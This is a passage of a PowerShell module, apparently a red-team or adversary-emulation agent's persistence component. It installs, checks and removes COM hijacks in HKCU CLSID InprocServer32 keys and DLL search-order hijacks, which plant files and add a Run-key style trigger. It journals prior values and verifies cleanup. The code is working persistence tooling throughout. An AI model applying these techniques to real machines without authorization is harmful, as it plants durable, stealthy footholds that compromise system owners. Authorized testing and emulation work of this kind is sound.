    $pre = Probe-VvPersistTech $trigLoc
    $ev.preExisted = $pre.Present
    $canon = ConvertTo-VvCanonicalTarget $targetLine
    if ($pre.Present -and (ConvertTo-VvCanonicalTarget ([string]$pre.Value)) -eq $canon) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'already installed and intact (plants hash-verified; the trigger re-read matches the copied-host line) - idempotent no-op'
      Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $true; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present -and -not $Overwrite) {
      $ev.state = 'refused-clobber'
      $ev.note = 'the trigger location already holds a FOREIGN value (sha256 ' + (Get-VvPersistSha256Hex ([string]$pre.Value)).Substring(0, 12) + '...) - REFUSED to clobber it silently. The plant files are journaled and remove takes them back; re-task with overwrite:true to journal the old trigger value and replace it.'
      Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $false; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present) { $ev.overwriteJournaled = $true }
    Apply-VvPersistTech $trigLoc $targetLine
    $post = Probe-VvPersistTech $trigLoc
    $triggerOk = ($post.Present -and (ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq $canon)
    $ev.installVerified = ($triggerOk -and (@($ev.files | Where-Object { $_.planted -eq $true }).Count -eq $plants.Count))
    if (-not $ev.installVerified) {
      $ev.state = 'failed'
      $ev.error = 'the dllsearch install did NOT fully verify (trigger re-read or a plant mismatch) - nothing claimed; remove will still take this entry back.'
    } else {
      $ev.state = 'installed'
      $ev.note = 'plants sha256-verified in the governed dir and the ' + $triggerTech + ' trigger re-read-verified pointing at the COPY - whether the copied host search-order-loads the planted name on this build is MEASURED per engagement (execproxy marker/edrview), never claimed'
    }
    Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $pre.Present; value = $(if ($ev.overwriteJournaled) { [string]$pre.Value } else { $null }); valueSha256 = $(if ($pre.Present) { Get-VvPersistSha256Hex ([string]$pre.Value) } else { $null }) } $ev.overwriteJournaled
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# Deep status: LIVE re-read (measured now, never remembered) + the trigger model
# (always) + the benign resolve-proof for comhijack when prove:true.
function Get-VvDeepStatusOne([string]$Key, [string]$Tech, [string]$Name, $Deep, $Manifest, [bool]$Prove, [string]$ManifestPath) {
  $entry = $Manifest.entries[$Key]
  if ($null -eq $Deep -and $null -ne $entry -and $null -ne $entry.deep) { $Deep = $entry.deep }
  if ($null -eq $Deep) {
    return [ordered]@{
      state = 'absent'; technique = $Tech; entryKey = $Key; location = $null; target = $null; targetSha256 = $null
      preExisted = $false; overwriteJournaled = $false; installVerified = $null; removalVerified = $null; journalRestored = $null
      triggerModel = (Get-VvPersistTriggerModel $Tech)
      note = 'no manifest entry and no deep params supplied - a deep location is parameter-derived (a CLSID / a governed plant dir), so there is nothing to re-read; NOT claimed present, never assumed removed-out-of-band'
      error = $null
    }
  }
  if ($Tech -eq 'comhijack') {
    $clsid = ([string]$Deep.clsid).ToUpper()
    $dll = [string]$Deep.dll
    $ev = New-VvDeepEv 'comhijack' $Key ('HKCU\Software\Classes\CLSID\' + $clsid + '\InprocServer32') $dll $Deep
    try {
      if ($null -ne $entry -and $null -ne $entry.deep) {
        $ev.classification = [string]$entry.deep.classification; $ev.shadow = ($entry.deep.shadow -eq $true); $ev.dllSha256 = [string]$entry.deep.dllSha256
      }
      $cur = Probe-VvComRegistration 'HKCU' $clsid
      if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
      if ($cur.Present -and ([string]$cur.Value) -eq $dll) {
        $ev.state = 'installed'; $ev.installVerified = $true
        $ev.note = $(if ($null -ne $entry) { 'hijack present and intact (the InprocServer32 re-read matches the payload path)' } else { 'hijack present and intact (value-identified as ours; no manifest entry)' }) + $(if ($ev.shadow) { ' - SHADOW: this hijack shadows an HKLM registration (higher impact, flagged at install)' } else { '' })
        if ($Prove) { $ev.resolveProof = Invoke-VvComResolveProof $clsid (Split-Path $ManifestPath -Parent) }
      } elseif ($cur.Present) {
        if ($null -ne $entry -and $entry.state -eq 'installed') {
          $ev.state = 'tampered'
          $ev.note = 'the InprocServer32 holds a DIFFERENT value than this agent installed (sha256 ' + (Get-VvPersistSha256Hex ([string]$cur.Value)).Substring(0, 12) + '...) - changed since install; reporting honestly'
        } else {
          $ev.state = 'foreign-present'
          $ev.note = 'the InprocServer32 holds a value this agent never installed - not ours, never claimed'
        }
        if ($Prove) { $ev.resolveProof = @{ attempted = $false; resolved = $false; hresult = $null; detail = 'proof SKIPPED: the value present is not this agent''s (tampered/foreign) - instantiating someone else''s server is not a benign proof'; childExited = $false; childExitCode = $null } }
      } elseif ($null -ne $entry -and $entry.removalVerified -eq $true) {
        $ev.state = 'removed'; $ev.removalVerified = $true
        $ev.note = 'verified absent (removal was proven at ' + $(if ($entry.removedAt) { [string]$entry.removedAt } else { 'remove time' }) + '; still absent at this live re-read - the CLSID resolves exactly as it did pre-install)'
      } elseif ($null -ne $entry -and $entry.state -eq 'installed') {
        $ev.state = 'missing'
        $ev.note = 'manifest says installed but the hijack is GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.'
      } else {
        $ev.state = 'absent'
        $ev.note = 'not installed (no manifest entry, the InprocServer32 is clean at live re-read)'
      }
      if ($Prove -and $null -eq $ev.resolveProof -and $ev.state -ne 'installed') {
        $ev.resolveProof = @{ attempted = $false; resolved = $false; hresult = $null; detail = 'proof SKIPPED: the hijack is not installed (state ' + $ev.state + ') - there is nothing of ours to resolve'; childExited = $false; childExitCode = $null }
      }
    } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
    return $ev
  }
  # dllsearch status: trigger re-read + per-file hash re-read.
  $targetLine = $(if ($Deep.trigger -and $Deep.trigger.value) { [string]$Deep.trigger.value } else { $null })
  $triggerTech = $(if ($Deep.trigger -and $Deep.trigger.technique) { ([string]$Deep.trigger.technique).ToLower() } else { 'runkey' })
  $trigLoc = Get-VvPersistLoc $triggerTech $Name
  $ev = New-VvDeepEv 'dllsearch' $Key $trigLoc.Location $targetLine $Deep
  try {
    $plantDir = $(if ($Deep.plantDir) { [string]$Deep.plantDir } else { Join-Path (Split-Path $ManifestPath -Parent) ('persist-dllsearch-' + $Name) })
    $ev.plantDir = $plantDir
    $ev.trigger = @{ technique = $triggerTech; location = $trigLoc.Location }
    if (-not $targetLine) { $targetLine = '"' + (Join-Path $plantDir (Split-Path ([string]$Deep.host) -Leaf)) + '"'; $ev.target = $targetLine; $ev.targetSha256 = Get-VvPersistSha256Hex $targetLine }
    if ($null -ne $entry -and $null -ne $entry.deep) { $ev.dllSha256 = [string]$entry.deep.dllSha256; $ev.hostSha256 = [string]$entry.deep.hostSha256 }
    $trig = Probe-VvPersistTech $trigLoc
    $canon = ConvertTo-VvCanonicalTarget $targetLine
    $anyPresent = ($trig.Present -eq $true)
    $anyTampered = ($trig.Present -and ((ConvertTo-VvCanonicalTarget ([string]$trig.Value)) -ne $canon))
    $anyUnverifiable = $false
    $recorded = @()
    if ($null -ne $entry -and $null -ne $entry.deep -and $null -ne $entry.deep.files) { $recorded = @($entry.deep.files) }
    if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    foreach ($f in $recorded) {
      $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $null; present = $false; planted = ($f.planted -eq $true); removalVerified = $null; state = $null }
      try {
        $curF = Probe-VvPersistFile ([string]$f.path)
        $rec.present = $curF.Present; $rec.sha256 = $curF.Sha256
        if ($rec.present) {
          $anyPresent = $true
          if ($f.sha256 -and $curF.Sha256 -eq ([string]$f.sha256)) { $rec.state = 'planted' } else { $rec.state = 'tampered'; $anyTampered = $true }
        } else {
          $rec.state = $(if ($null -ne $entry -and $entry.removalVerified -eq $true) { 'removed'; $rec.removalVerified = $true } else { 'absent' })
        }
      } catch { $rec.state = 'unknown'; $anyUnverifiable = $true }
      $ev.files = @($ev.files) + $rec
    }
    if ($anyTampered) {
      $ev.state = $(if ($null -ne $entry -and $entry.state -eq 'installed') { 'tampered' } else { 'foreign-present' })
      $ev.note = 'a dllsearch artifact CHANGED under us (trigger value or a planted file hash) - reported honestly; removal refuses to delete foreign bytes'
    } elseif ($anyPresent) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'trigger and plant files present and intact at live re-read (trigger line matches the copied host; every planted file hash-matches)'
    } elseif ($anyUnverifiable) {
      $ev.state = 'unknown'; $ev.note = 'a probe failed - never assume absence'
    } elseif ($null -ne $entry -and $entry.removalVerified -eq $true) {
      $ev.state = 'removed'; $ev.removalVerified = $true
      $ev.note = 'verified absent (removal was proven at ' + $(if ($entry.removedAt) { [string]$entry.removedAt } else { 'remove time' }) + '; trigger and every plant still absent at this live re-read)'
    } elseif ($null -ne $entry -and $entry.state -eq 'installed') {
      $ev.state = 'missing'
      $ev.note = 'manifest says installed but the artifacts are GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.'
    } else {
      $ev.state = 'absent'
      $ev.note = 'not installed (no manifest entry; trigger location and plant paths clean at live re-read)'
    }
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# Deep removal: execute, then VERIFY - identical doctrine. comhijack: the classic dance
# against the hijacked value (a journaled foreign value is RESTORED; a shadow install
# un-shadows by deletion - HKLM is never touched). dllsearch: disarm the TRIGGER FIRST,
# then delete ONLY hash-matching plants (foreign bytes = loud refused-foreign), then
# the plant dir; removalVerified = trigger verified AND every planted file verified.
function Remove-VvDeepTechOne([string]$Key, [string]$Tech, [string]$Name, $Deep, $Manifest, [string]$ManifestPath) {
  $entry = $Manifest.entries[$Key]
  if ($null -eq $Deep -and $null -ne $entry -and $null -ne $entry.deep) { $Deep = $entry.deep }
  if ($null -eq $Deep) {
    return [ordered]@{
      state = 'removed'; technique = $Tech; entryKey = $Key; location = $null; target = $null; targetSha256 = $null
      preExisted = $false; overwriteJournaled = $false; installVerified = $null; removalVerified = $true; journalRestored = $null
      triggerModel = (Get-VvPersistTriggerModel $Tech)
      note = $(if ($null -ne $entry) { 'manifest entry carries no deep params - nothing locatable to remove; reported honestly' } else { 'nothing installed (no manifest entry, no params) - verified clean of anything this agent recorded' })
      error = $null
    }
  }
  if ($Tech -eq 'comhijack') {
    $clsid = ([string]$Deep.clsid).ToUpper()
    $dll = [string]$Deep.dll
    $ev = New-VvDeepEv 'comhijack' $Key ('HKCU\Software\Classes\CLSID\' + $clsid + '\InprocServer32') $dll $Deep
    try {
      if ($null -ne $entry -and $null -ne $entry.deep) { $ev.classification = [string]$entry.deep.classification; $ev.shadow = ($entry.deep.shadow -eq $true); $ev.dllSha256 = [string]$entry.deep.dllSha256 }
      if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
      if ($null -ne $entry -and $entry.overwriteJournaled -eq $true -and $null -ne $entry.preInstall.value) {
        $ev.overwriteJournaled = $true
        Apply-VvComHijack $clsid ([string]$entry.preInstall.value)
        $post = Probe-VvComRegistration 'HKCU' $clsid
        $ev.journalRestored = ($post.Present -and ([string]$post.Value) -eq ([string]$entry.preInstall.value))
        $ev.removalVerified = $ev.journalRestored
        if (-not $ev.journalRestored) {
          $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
          $ev.error = 'journal restore did NOT verify (re-read != the journaled pre-install value) - the InprocServer32 does NOT hold what it held before install (LOUD; escalate to the operator)'
          return $ev
        }
        $ev.state = 'removed'
        $ev.note = 'the journaled pre-install value was restored and re-verified - the InprocServer32 provably holds what it held before install'
        $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
        return $ev
      }
      $cur = Probe-VvComRegistration 'HKCU' $clsid
      if ($cur.Present) {
        $claimed = ($null -ne $entry) -or (([string]$cur.Value) -eq $dll)
        if (-not $claimed) {
          $ev.state = 'refused-foreign'
          $ev.note = 'the InprocServer32 holds a value this agent NEVER installed (no manifest entry, value mismatch) - REFUSED to remove what we did not write'
          return $ev
        }
        $containerPreExisted = ($null -ne $entry -and $null -ne $entry.deep -and $entry.deep.containerPresent -eq $true)
        Clear-VvComHijack $clsid $containerPreExisted
        $post = Probe-VvComRegistration 'HKCU' $clsid
        $ev.removalVerified = (-not $post.Present)
        if (-not $ev.removalVerified) {
          $ev.state = 'removal-failed'
          if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
          $ev.error = 'remove executed but the hijack is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)'
          return $ev
        }
        $ev.state = 'removed'
        $ev.note = $(if ($ev.shadow) { 'hijack deleted and verified absent - the HKLM registration is UN-SHADOWED (it was never touched); the class resolves machine-wide again' } else { 'hijack deleted and verified absent - the per-user registration is gone; the CLSID resolves exactly as it did pre-install' })
        if ($null -ne $entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
        return $ev
      }
      $ev.state = 'removed'; $ev.removalVerified = $true
      $ev.note = $(if ($null -ne $entry) { 'already absent at remove time - absence re-verified now' } else { 'nothing installed (no manifest entry) - the location is verified clean' })
      if ($null -ne $entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      return $ev
    } catch {
      $ev.state = 'removal-failed'
      if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
      $ev.error = [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate)'
      return $ev
    }
  }
  # dllsearch removal
  $targetLine = $(if ($Deep.trigger -and $Deep.trigger.value) { [string]$Deep.trigger.value } else { $null })
  $triggerTech = $(if ($Deep.trigger -and $Deep.trigger.technique) { ([string]$Deep.trigger.technique).ToLower() } else { 'runkey' })
  $trigLoc = Get-VvPersistLoc $triggerTech $Name
  $ev = New-VvDeepEv 'dllsearch' $Key $trigLoc.Location $targetLine $Deep
  try {
    $plantDir = $(if ($Deep.plantDir) { [string]$Deep.plantDir } else { Join-Path (Split-Path $ManifestPath -Parent) ('persist-dllsearch-' + $Name) })
    $ev.plantDir = $plantDir
    $ev.trigger = @{ technique = $triggerTech; location = $trigLoc.Location }
    if (-not $targetLine) { $targetLine = '"' + (Join-Path $plantDir (Split-Path ([string]$Deep.host) -Leaf)) + '"'; $ev.target = $targetLine; $ev.targetSha256 = Get-VvPersistSha256Hex $targetLine }
    if ($null -ne $entry -and $null -ne $entry.deep) { $ev.dllSha256 = [string]$entry.deep.dllSha256; $ev.hostSha256 = [string]$entry.deep.hostSha256 }
    if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    # 1. DISARM THE TRIGGER FIRST (journaled restore, or delete + verify).
    if ($null -ne $entry -and $entry.overwriteJournaled -eq $true -and $null -ne $entry.preInstall.value) {
      $ev.overwriteJournaled = $true
      Apply-VvPersistTech $trigLoc ([string]$entry.preInstall.value)
      $post = Probe-VvPersistTech $trigLoc
      $ev.journalRestored = ($post.Present -and ((ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq (ConvertTo-VvCanonicalTarget ([string]$entry.preInstall.value))))
      if (-not $ev.journalRestored) {
        $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
        $ev.error = 'trigger journal restore did NOT verify - the trigger location does NOT hold what it held before install (LOUD; escalate)'
        return $ev
      }
    } else {
      $cur = Probe-VvPersistTech $trigLoc
      if ($cur.Present) {
        $claimed = ($null -ne $entry) -or ((ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq (ConvertTo-VvCanonicalTarget $targetLine))
        if (-not $claimed) {
          $ev.state = 'refused-foreign'
          $ev.note = 'the trigger location holds a value this agent NEVER installed (no manifest entry, value mismatch) - REFUSED to remove what we did not write; the plant files (if any) stay journaled'
          return $ev
        }
        Clear-VvPersistTech $trigLoc
        $post = Probe-VvPersistTech $trigLoc
        if ($post.Present) {
          $ev.state = 'removal-failed'
          if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
          $ev.error = 'trigger remove executed but the value is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated; the persistence may STILL FIRE at next logon)'
          return $ev
        }
      }
    }
    # 2. THE PLANTS - delete ONLY files whose live hash still matches what we planted.
    $recorded = @()
    if ($null -ne $entry -and $null -ne $entry.deep -and $null -ne $entry.deep.files) { $recorded = @($entry.deep.files | Where-Object { $_.planted -eq $true }) }
    foreach ($f in $recorded) {
      $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $null; present = $false; planted = $true; removalVerified = $null }
      $preF = Probe-VvPersistFile ([string]$f.path)
      if ($preF.Present -and $preF.Sha256 -ne ([string]$f.sha256)) {
        $rec.present = $true; $rec.sha256 = $preF.Sha256
        $ev.files = @($ev.files) + $rec
        $ev.state = 'refused-foreign'
        $ev.error = 'plant file now holds FOREIGN bytes (hash changed since plant): ' + [string]$f.path + ' - REFUSED to delete what we did not write (LOUD; escalate to the operator)'
        return $ev
      }
      if ($preF.Present) {
        try { Remove-Item -LiteralPath ([string]$f.path) -Force -ErrorAction Stop } catch {
          $rec.present = $true; $rec.sha256 = $preF.Sha256
          $ev.files = @($ev.files) + $rec
          $ev.state = 'removal-failed'
          if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
          $ev.error = 'remove failed for ' + [string]$f.path + ': ' + [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate; a still-running copied host holds its files locked - kill it first)'
          return $ev
        }
      }
      $postF = Probe-VvPersistFile ([string]$f.path)
      $rec.removalVerified = (-not $postF.Present)
      $rec.present = $postF.Present
      $ev.files = @($ev.files) + $rec
      if (-not $rec.removalVerified) {
        $ev.state = 'removal-failed'
        if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
        $ev.error = 'remove executed but ' + [string]$f.path + ' is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)'
        return $ev
      }
    }
    # 3. the plant dir itself goes last (best-effort; a lingering empty dir is reported
    #    by status, never hidden).
    try { if (Test-Path -LiteralPath $plantDir) { Remove-Item -LiteralPath $plantDir -Recurse -Force -ErrorAction Stop } } catch {}
    $ev.removalVerified = $true
    $ev.state = 'removed'
    $ev.note = $(if ($ev.overwriteJournaled) { 'the journaled pre-install trigger value was restored and re-verified; ' } else { 'the trigger was deleted and verified absent; ' }) + 'every planted file was deleted and re-read absent - the plant provably holds nothing of ours'
    if ($null -ne $entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
    return $ev
  } catch {
    $ev.state = 'removal-failed'
    if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
    $ev.error = [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate)'
    return $ev
  }
}

# The deep half of the engagement sweep: re-probe ONE manifest entry's recorded
# artifact set LIVE (comhijack: the InprocServer32 value; dllsearch: the trigger value
# + every planted file). Verified === true ONLY with every artifact measured absent.
function Probe-VvDeepEntryPresence($Entry, [string]$Tag) {
  if ($Entry.technique -eq 'comhijack') {
    $cur = $null
    try { $cur = Probe-VvComRegistration 'HKCU' ([string]$Entry.deep.clsid) } catch { $cur = $null }
    if ($null -ne $cur -and $cur.Present) {
      $st = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } elseif (([string]$cur.Value) -eq ([string]$Entry.deep.dll)) { 'installed' } else { 'tampered' })
      return @{ State = $st; Verified = $false; Note = 'STILL PRESENT at the sweep - unverified persistence; the engagement is NOT clean' }
    }
    if ($null -ne $cur -and -not $cur.Present) {
      return @{ State = 'absent'; Verified = $true; Note = 'live-verified absent at sweep (measured now, not remembered)' }
    }
    return @{ State = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } else { 'unknown' }); Verified = $false; Note = 'sweep probe failed - removal UNVERIFIED (treated as open: never assume absence)' }
  }
  $anyPresent = $false; $probeFailed = $false
  $trigTech = $(if ($Entry.deep.trigger -and $Entry.deep.trigger.technique) { ([string]$Entry.deep.trigger.technique).ToLower() } else { 'runkey' })
  try { $trig = Probe-VvPersistTech (Get-VvPersistLoc $trigTech $Tag); if ($trig.Present) { $anyPresent = $true } } catch { $probeFailed = $true }
  if ($null -ne $Entry.deep.files) {
    foreach ($f in @($Entry.deep.files | Where-Object { $_.planted -eq $true })) {
      try { $curF = Probe-VvPersistFile ([string]$f.path); if ($curF.Present) { $anyPresent = $true } } catch { $probeFailed = $true }
    }
  }
  if ($anyPresent) { return @{ State = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } else { 'installed' }); Verified = $false; Note = 'STILL PRESENT at the sweep (trigger value and/or planted files) - unverified persistence; the engagement is NOT clean' } }
  if ($probeFailed) { return @{ State = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } else { 'unknown' }); Verified = $false; Note = 'a sweep probe failed - removal UNVERIFIED (treated as open: never assume absence)' } }
  return @{ State = 'absent'; Verified = $true; Note = 'live-verified absent at sweep (trigger + every planted file measured absent now, not remembered)' }
}

# --- The removal manifest (the accountability record that outlives this process) ---
function Read-VvPersistManifest([string]$Path, [string]$Name, [string]$Target) {
  if ($Path -and (Test-Path -LiteralPath $Path)) {
    try {
      $j = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
      $m = @{ version = 1; tag = $(if ($j.tag) { [string]$j.tag } else { $null }); target = $(if ($j.target) { [string]$j.target } else { $null }); targetSha256 = $(if ($j.targetSha256) { [string]$j.targetSha256 } else { $null }); createdAt = $(if ($j.createdAt) { [string]$j.createdAt } else { [DateTime]::UtcNow.ToString('o') }); entries = @{} }
      if ($j.entries) {
        foreach ($prop in $j.entries.PSObject.Properties) {
          $e = $prop.Value
          $m.entries[$prop.Name] = @{
            technique = [string]$e.technique; location = [string]$e.location; targetSha256 = [string]$e.targetSha256
            deep = $(if ($null -ne $e.deep) { $e.deep } else { $null }) # deep params journal (clsid/dll/plant set) - pass-through, re-serialized at write
            preInstall = @{ present = ($e.preInstall.present -eq $true); value = $(if ($null -ne $e.preInstall.value) { [string]$e.preInstall.value } else { $null }); valueSha256 = $(if ($e.preInstall.valueSha256) { [string]$e.preInstall.valueSha256 } else { $null }) }
            overwriteJournaled = ($e.overwriteJournaled -eq $true)
            state = [string]$e.state; installedAt = [string]$e.installedAt
            removedAt = $(if ($e.removedAt) { [string]$e.removedAt } else { $null })
            removalVerified = $(if ($null -ne $e.removalVerified) { $e.removalVerified -eq $true } else { $null })
          }
        }
      }
      return $m
    } catch { } # a corrupt/unreadable manifest falls through to a fresh one - the op notes it
  }
  return @{ version = 1; tag = $(if ($Name) { $Name } else { $null }); target = $(if ($Target) { $Target } else { $null }); targetSha256 = $(if ($Target) { Get-VvPersistSha256Hex $Target } else { $null }); createdAt = [DateTime]::UtcNow.ToString('o'); entries = @{} }
}

function Write-VvPersistManifest([string]$Path, $Manifest) {
  if (-not $Path) { return $false }
  try {
    $dir = Split-Path $Path -Parent
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    ($Manifest | ConvertTo-Json -Depth 8 -Compress) | Set-Content -LiteralPath $Path -Encoding UTF8 -ErrorAction Stop
    return $true
  } catch { return $false }
}

function Save-VvPersistEntry($Manifest, [string]$Tech, $Ev, $PreInstall, [bool]$Journaled) {
  $prev = $Manifest.entries[$Tech]
  $Manifest.entries[$Tech] = @{
    technique = $Tech; location = $Ev.location; targetSha256 = $Ev.targetSha256
    preInstall = $PreInstall
    overwriteJournaled = $Journaled
    # honest state: an install whose write did NOT verify is recorded as 'failed' (the
    # entry exists so remove can still take it back - the sweep re-probes live)
    state = $(if ($Ev.state -eq 'installed') { 'installed' } else { 'failed' })
    installedAt = $(if ($prev -and $prev.installedAt) { [string]$prev.installedAt } else { [DateTime]::UtcNow.ToString('o') })
    removedAt = $null; removalVerified = $null
  }
}

function New-VvPersistEv([string]$Tech, $Loc, [string]$Target) {
  return [ordered]@{
    state = 'failed'; technique = $Tech; location = $Loc.Location
    target = $(if ($Target) { $Target } else { $null }); targetSha256 = $(if ($Target) { Get-VvPersistSha256Hex $Target } else { $null })
    preExisted = $false; overwriteJournaled = $false
    installVerified = $null; removalVerified = $null; journalRestored = $null
    note = $null; error = $null
  }
}

# install(): pre-install snapshot FIRST; a foreign value is never clobbered silently
# (refuse, or journal-then-replace when overwrite was passed); the write is PROVEN by
# re-read. Returns the per-technique evidence object.
function Install-VvPersistTechOne([string]$Tech, [string]$Name, [string]$Target, $Manifest, [bool]$Overwrite) {
  $loc = Get-VvPersistLoc $Tech $Name
  $ev = New-VvPersistEv $Tech $loc $Target
  $canon = ConvertTo-VvCanonicalTarget $Target
  try {
    $pre = Probe-VvPersistTech $loc
    $ev.preExisted = $pre.Present
    if ($pre.Present -and (ConvertTo-VvCanonicalTarget ([string]$pre.Value)) -eq $canon) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'already installed and intact (live re-read matches the target line) - idempotent no-op'
      Save-VvPersistEntry $Manifest $Tech $ev @{ present = $true; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present -and -not $Overwrite) {
      $ev.state = 'refused-clobber'
      $ev.note = 'location already holds a FOREIGN value (sha256 ' + (Get-VvPersistSha256Hex ([string]$pre.Value)).Substring(0, 12) + '...) - REFUSED to clobber it silently. Re-task with overwrite:true to journal the old value and replace it; the journal restores it on remove.'
      return $ev
    }
    if ($pre.Present) { $ev.overwriteJournaled = $true }
    Apply-VvPersistTech $loc $Target
    $post = Probe-VvPersistTech $loc
    $ev.installVerified = ($post.Present -and (ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq $canon)
    if (-not $ev.installVerified) {
      $ev.state = 'failed'
      $ev.error = 'install write did NOT verify (re-read mismatch - the location does not hold the target line). Nothing claimed; remove will still take this entry back.'
    } else {
      $ev.state = 'installed'
    }
    Save-VvPersistEntry $Manifest $Tech $ev @{ present = $pre.Present; value = $(if ($ev.overwriteJournaled) { [string]$pre.Value } else { $null }); valueSha256 = $(if ($pre.Present) { Get-VvPersistSha256Hex ([string]$pre.Value) } else { $null }) } $ev.overwriteJournaled
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# status(): LIVE re-read - present + intact + pointing at the right target line,
# measured now, never remembered.
function Get-VvPersistStatusOne([string]$Tech, [string]$Name, $Manifest, [string]$Target) {
  $loc = Get-VvPersistLoc $Tech $Name
  $ev = New-VvPersistEv $Tech $loc $Target
  $entry = $Manifest.entries[$Tech]
  try {
    $cur = Probe-VvPersistTech $loc
    $canon = $(if ($Target) { ConvertTo-VvCanonicalTarget $Target } else { $null })
    if ($entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    if ($cur.Present -and $canon -and (ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq $canon) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = $(if ($entry) { 'present and intact (live re-read matches the target line)' } else { 'present and intact (value-identified as ours; no manifest entry)' })
    } elseif ($cur.Present) {
      if ($entry -and $entry.state -eq 'installed') {
        $ev.state = 'tampered'
        $ev.note = 'the location holds a DIFFERENT value than this agent installed (sha256 ' + (Get-VvPersistSha256Hex ([string]$cur.Value)).Substring(0, 12) + '...) - changed since install; reporting honestly'
      } else {
        $ev.state = 'foreign-present'
        $ev.note = 'the location holds a value this agent never installed - not ours, never claimed'
      }
    } elseif ($entry -and $entry.removalVerified -eq $true) {
      $ev.state = 'removed'; $ev.removalVerified = $true
      $ev.note = 'verified absent (removal was proven at ' + $(if ($entry.removedAt) { [string]$entry.removedAt } else { 'remove time' }) + '; still absent at this live re-read)'
    } elseif ($entry -and $entry.state -eq 'installed') {
      $ev.state = 'missing'
      $ev.note = 'manifest says installed but the location is GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.'
    } else {
      $ev.state = 'absent'
      $ev.note = 'not installed (no manifest entry, location clean at live re-read)'
    }
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# remove(): execute, then VERIFY. A journaled pre-install value is RESTORED (not
# deleted) and re-verified. A removal whose re-read still shows the location present is
# 'removal-failed' - LOUD, escalated, and the entry STAYS in the manifest as an open
# loose end. A foreign value this agent never installed is REFUSED (we never delete
# what we did not write).
function Remove-VvPersistTechOne([string]$Tech, [string]$Name, $Manifest, [string]$Target) {
  $loc = Get-VvPersistLoc $Tech $Name
  $ev = New-VvPersistEv $Tech $loc $Target
  $entry = $Manifest.entries[$Tech]
  try {
    if ($entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    if ($entry -and $entry.overwriteJournaled -and $null -ne $entry.preInstall.value) {
      $ev.overwriteJournaled = $true
      Apply-VvPersistTech $loc ([string]$entry.preInstall.value)
      $post = Probe-VvPersistTech $loc
      $ev.journalRestored = ($post.Present -and (ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq (ConvertTo-VvCanonicalTarget ([string]$entry.preInstall.value)))
      $ev.removalVerified = $ev.journalRestored
      if (-not $ev.journalRestored) {
        $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
        $ev.error = 'journal restore did NOT verify (re-read != the journaled pre-install value) - the location does NOT hold what it held before install (LOUD; escalate to the operator)'
        return $ev
      }
      $ev.state = 'removed'
